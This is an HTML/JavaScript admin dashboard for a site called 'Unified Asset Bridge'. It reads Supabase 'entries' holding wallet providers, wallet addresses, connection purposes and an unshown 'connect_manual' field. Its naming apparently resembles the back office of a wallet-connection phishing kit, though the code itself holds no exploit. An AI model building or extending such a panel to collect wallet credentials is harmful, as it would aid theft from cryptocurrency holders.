<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Dashboard · Unified Asset Bridge</title>

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />

    <style>
      :root {
        --bg: #0b1220;
        --bg-soft: #111a2e;
        --surface: #17233a;
        --border: #263550;
        --text: #f8fafc;
        --muted: #94a3b8;
        --subtle: #64748b;
        --accent: #3b82f6;
        --accent-hover: #2563eb;
        --danger: #ef4444;
      }

      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      html,
      body {
        min-height: 100%;
        background: var(--bg);
      }

      body {
        min-height: 100vh;
        min-height: 100svh;
        font-family: "Inter", system-ui, sans-serif;
        color: var(--text);
        padding: 32px 24px;
      }

      .wrap {
        width: min(100%, 1100px);
        margin: 0 auto;
      }

      header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 32px;
        flex-wrap: wrap;
        gap: 16px;
      }

      h1 {
        font-size: 24px;
        font-weight: 700;
        letter-spacing: -0.02em;
      }

      .badge {
        display: inline-block;
        padding: 5px 12px;
        background: var(--bg-soft);
        border: 1px solid var(--border);
        border-radius: 100px;
        color: #93bbfc;
        font-size: 10px;
        font-weight: 600;
        letter-spacing: 0.12em;
        text-transform: uppercase;
        margin-bottom: 8px;
      }

      .actions {
        display: flex;
        gap: 10px;
      }

      .btn {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        padding: 10px 18px;
        border-radius: 10px;
        font-size: 13px;
        font-weight: 600;
        border: 1px solid var(--border);
        background: var(--bg-soft);
        color: var(--text);
        cursor: pointer;
        text-decoration: none;
        transition: background-color 0.15s ease;
        font-family: inherit;
      }

      .btn:hover {
        background: #1a263e;
      }
      .btn.primary {
        background: var(--accent);
        border-color: var(--accent);
        color: #fff;
      }
      .btn.primary:hover {
        background: var(--accent-hover);
      }

      .stats {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 16px;
        margin-bottom: 32px;
      }

      .stat {
        background: var(--surface);
        border: 1px solid var(--border);
        border-radius: 16px;
        padding: 22px 24px;
      }

      .stat-label {
        font-size: 11px;
        font-weight: 600;
        letter-spacing: 0.1em;
        text-transform: uppercase;
        color: var(--subtle);
        margin-bottom: 10px;
      }

      .stat-value {
        font-size: 30px;
        font-weight: 700;
        letter-spacing: -0.02em;
      }

      .panel {
        background: var(--surface);
        border: 1px solid var(--border);
        border-radius: 16px;
        padding: 24px;
      }

      .panel h2 {
        font-size: 16px;
        font-weight: 600;
        margin-bottom: 18px;
      }

      .recent-list {
        display: flex;
        flex-direction: column;
        gap: 10px;
      }

      .recent-item {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 14px 18px;
        background: var(--bg-soft);
        border: 1px solid var(--border);
        border-radius: 12px;
        font-size: 13px;
      }

      .recent-item .left {
        display: flex;
        flex-direction: column;
        gap: 2px;
      }
      .recent-item .provider {
        font-weight: 600;
      }
      .recent-item .meta {
        color: var(--subtle);
        font-size: 11px;
      }

      .tag {
        font-size: 10px;
        padding: 4px 10px;
        border-radius: 100px;
        background: rgba(34, 197, 94, 0.12);
        color: #22c55e;
        font-weight: 600;
        letter-spacing: 0.05em;
        text-transform: uppercase;
      }

      .tag.pending {
        background: rgba(148, 163, 184, 0.12);
        color: var(--muted);
      }

      .empty {
        color: var(--subtle);
        font-size: 14px;
        padding: 20px 0;
        text-align: center;
      }
    </style>
  </head>

  <body>
    <div class="wrap">
      <header>
        <div>
          <div class="badge">Admin</div>
          <h1>Dashboard</h1>
        </div>
        <div class="actions">
          <a href="entries.html" class="btn">View all entries</a>
          <button class="btn primary" id="logoutBtn">Sign out</button>
        </div>
      </header>

      <div class="stats">
        <div class="stat">
          <div class="stat-label">Total entries</div>
          <div class="stat-value" id="statTotal">—</div>
        </div>
        <div class="stat">
          <div class="stat-label">Completed</div>
          <div class="stat-value" id="statCompleted">—</div>
        </div>
        <div class="stat">
          <div class="stat-label">Today</div>
          <div class="stat-value" id="statToday">—</div>
        </div>
      </div>

      <div class="panel">
        <h2>Recent submissions</h2>
        <div class="recent-list" id="recentList">
          <div class="empty">Loading…</div>
        </div>
      </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
      window.SUPABASE_URL = "https://jrjbfbpjmcxkgchhdxwo.supabase.co";
      window.SUPABASE_ANON_KEY =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpyamJmYnBqbWN4a2djaGhkeHdvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIxNTQ2NzIsImV4cCI6MjEwNzczMDY3Mn0.Azo2z4xNsmjwfUWby_aVLlPhkBld3-7Dts6woerPTMI";
      window.supabaseClient = supabase.createClient(
        window.SUPABASE_URL,
        window.SUPABASE_ANON_KEY,
      );

      function escapeHtml(s) {
        return String(s).replace(
          /[&<>"']/g,
          (c) =>
            ({
              "&": "&amp;",
              "<": "&lt;",
              ">": "&gt;",
              '"': "&quot;",
              "'": "&#39;",
            })[c],
        );
      }

      (async function () {
        const {
          data: { session },
        } = await window.supabaseClient.auth.getSession();
        if (!session) {
          window.location.href = "login.html";
          return;
        }

        document
          .getElementById("logoutBtn")
          .addEventListener("click", async () => {
            await window.supabaseClient.auth.signOut();
            window.location.href = "login.html";
          });

        const { count: total } = await window.supabaseClient
          .from("entries")
          .select("*", { count: "exact", head: true });

        const { count: completed } = await window.supabaseClient
          .from("entries")
          .select("*", { count: "exact", head: true })
          .eq("completed", true);

        const startOfDay = new Date();
        startOfDay.setHours(0, 0, 0, 0);
        const { count: today } = await window.supabaseClient
          .from("entries")
          .select("*", { count: "exact", head: true })
          .gte("created_at", startOfDay.toISOString());

        document.getElementById("statTotal").textContent = total ?? 0;
        document.getElementById("statCompleted").textContent = completed ?? 0;
        document.getElementById("statToday").textContent = today ?? 0;

        const { data: recent } = await window.supabaseClient
          .from("entries")
          .select(
            "id, session_id, connect_manual, connection_purpose, wallet_provider, wallet_address, completed, created_at",
          )
          .order("created_at", { ascending: false })
          .limit(8);

        const list = document.getElementById("recentList");
        if (!recent || recent.length === 0) {
          list.innerHTML = '<div class="empty">No entries yet.</div>';
        } else {
          list.innerHTML = recent
            .map(
              (e) => `
          <div class="recent-item">
            <div class="left">
              <span class="provider">${e.wallet_provider === "others" ? "Others" : escapeHtml(e.wallet_provider || "—")} · ${escapeHtml(e.connection_purpose || "—")}</span>
              <span class="meta">${escapeHtml(e.wallet_address || "no address")} · ${new Date(e.created_at).toLocaleString()}</span>
            </div>
            <span class="tag ${e.completed ? "" : "pending"}">${e.completed ? "Complete" : "Pending"}</span>
          </div>
        `,
            )
            .join("");
        }
      })();
    </script>
  </body>
</html>
